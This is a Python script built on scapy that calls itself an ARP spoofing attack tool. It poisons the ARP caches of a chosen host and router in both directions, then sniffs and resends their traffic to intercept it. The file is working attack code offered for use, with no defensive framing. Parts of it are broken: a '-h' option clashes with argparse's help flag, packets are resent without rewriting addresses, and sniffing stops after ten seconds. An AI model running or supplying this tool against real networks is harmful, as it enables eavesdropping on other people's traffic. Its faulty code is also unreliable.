import argparse
from scapy.all import *
import time
import threading
import sys
import signal

# Global flag to handle graceful termination
running = True

def arpSpoof(targetIp, spoofIp, iface):
    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
    while running:
        send(pkt, iface=iface, verbose=False)
        time.sleep(1)

def forwardPacket(pkt, hostIp, routerIp, iface):
    # Forward packet depending on destination
    if pkt.dst == hostIp and pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)
    elif pkt.dst == routerIp and pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)

def sniffAndForward(hostIp, routerIp, iface):
    print(f"Starting packet sniffing on {iface}")
    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, hostIp, routerIp, iface), store=0, timeout=10)

def startAttack(hostIp, routerIp, iface):
    # Start ARP poisoning threads
    threading.Thread(target=arpSpoof, args=(hostIp, routerIp, iface), daemon=True).start()
    threading.Thread(target=arpSpoof, args=(routerIp, hostIp, iface), daemon=True).start()
    # Start sniffing and forwarding packets
    sniffAndForward(hostIp, routerIp, iface)

def menu():
    RED = "\033[38;2;255;0;0m"
    RESET = "\033[0m"
    hostIp = input(f"{RED}\nHost IP: {RESET}")
    targetIp = input(f"{RED}Target IP: {RESET}")
    interface = input(f"{RED}Interface: {RESET}")
    startAttack(hostIp, targetIp, interface)

def terminal():
    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-h", "--hostip", required=True, help="Host IP address.")
    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.\nUsage: python3 arpspoof.py -h 192.168.1.10 -t 192.168.1.1 -i eth0")

    args = parser.parse_args()

    if args.hostip and args.targetip and args.interface:
        startAttack(args.hostip, args.targetip, args.interface)
    else:
        parser.error("Syntax error.")

def signal_handler(sig, frame):
    global running
    print("\nGracefully stopping attack...")
    running = False
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)  
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
